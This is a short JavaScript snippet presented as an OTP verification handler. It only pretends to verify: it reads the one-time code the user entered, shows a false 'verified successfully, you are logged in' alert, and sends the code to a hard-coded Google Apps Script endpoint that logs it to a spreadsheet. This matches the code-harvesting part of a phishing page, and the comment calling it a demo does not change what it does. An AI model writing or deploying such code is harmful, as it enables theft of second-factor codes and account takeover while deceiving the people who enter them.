// Function to handle OTP verification
function verifyOTP() {
    var otp = document.getElementById("otp").value;  // Get OTP value from input field

    // Here, you would typically verify the OTP with your backend or another service
    // For this demo, we just log the OTP and simulate verification success

    console.log("OTP entered:", otp);
    alert("OTP verified successfully! You are logged in.");

    // Optionally, send the OTP to Google Sheets or any other service
    sendOTPToSheet(otp);
}

// Function to send OTP to Google Sheets
function sendOTPToSheet(otp) {
    const actionUrl = "https://script.google.com/macros/s/AKfycbxH3HlSwn_4EhdgFFCgQ86amq1uP4A7z4hcKMWKuxVnzCHTZOWJ7IU6rfnXSxVfGwLzZQ/exec";  // Your Google Apps Script URL

    const formData = new FormData();
    formData.append('entry.0987654321', otp);  // Replace with correct entry ID for OTP

    fetch(actionUrl, {
        method: "POST",
        body: formData,
    })
    .then(response => response.text())
    .then(data => {
        console.log("OTP sent to Google Sheets:", data);
    })
    .catch(error => {
        console.error("Error sending OTP to Google Sheets:", error);
    });
}
